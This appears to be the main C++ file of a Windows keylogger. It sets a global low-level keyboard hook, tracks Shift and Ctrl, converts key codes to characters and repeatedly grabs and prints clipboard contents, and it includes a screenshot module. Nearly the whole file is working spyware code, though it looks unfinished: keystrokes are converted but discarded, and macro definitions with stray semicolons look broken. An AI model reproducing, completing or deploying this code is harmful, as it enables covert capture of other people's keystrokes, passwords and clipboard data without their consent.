#include "includes.h"
#include "handleChars.h"
#include "grabClipboard.h"
#include "monitor.h"
#include "takeScreenshot.h"

std::vector<std::string> savedChars = {}; //have to use string for TAB and stuff like that.
std::vector<std::string> savedSentences = { "" }; //init emtpy string fist off
std::string storedClipboardContents = "";

//main entry point

HHOOK* handle_to_hook = new HHOOK;
bool is_shift_on = false; //GLOBAL
bool is_control_on = false; //global

#define USE_LITERALS false;

LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
{
	KBDLLHOOKSTRUCT* keyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam);

#if USE_LITERALS

	std::cout << keyboardStruct->vkCode << '\n';

#else

	is_shift_on = handleShift();
	is_control_on = handleCTRL();

	//shift handling handling here, we do not need to print anything :)

	//we're gonna have to handle this a differnt way if we're actually going to log anything in a txt...

	auto vk = keyboardStruct->vkCode;

	if (vk != VK_LSHIFT && vk != VK_RSHIFT && vk != VK_LCONTROL && vk != VK_RCONTROL && wparam == WM_KEYDOWN)
	{
		//if statements all went through. we can now run our funcs.

		//don't know if we're actually going to handle control or not...
		//if (is_control_on)
		//	curCharStr += "c";

		std::string curCharStr = std::to_string(handleCharsFinal(vk, is_shift_on));

	}
	
	if (grabClipboard(storedClipboardContents))
	{
		std::cout << "CLIPBOARD: " << storedClipboardContents << '\n';
	}

#endif

	return CallNextHookEx(NULL, code, wparam, lparam);
}

__forceinline void startHook()
{
	*handle_to_hook = SetWindowsHookExA(WH_KEYBOARD_LL, proc, NULL, 0);
	if (*handle_to_hook == NULL)
	{
		//masive error occurred here....
		exit(-1);
	}
}

#define test false;

int main()
{
#if test



#else
	startHook();

	//message handling (while this is running, the program is running)
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(*handle_to_hook);

#endif
	return 0;
}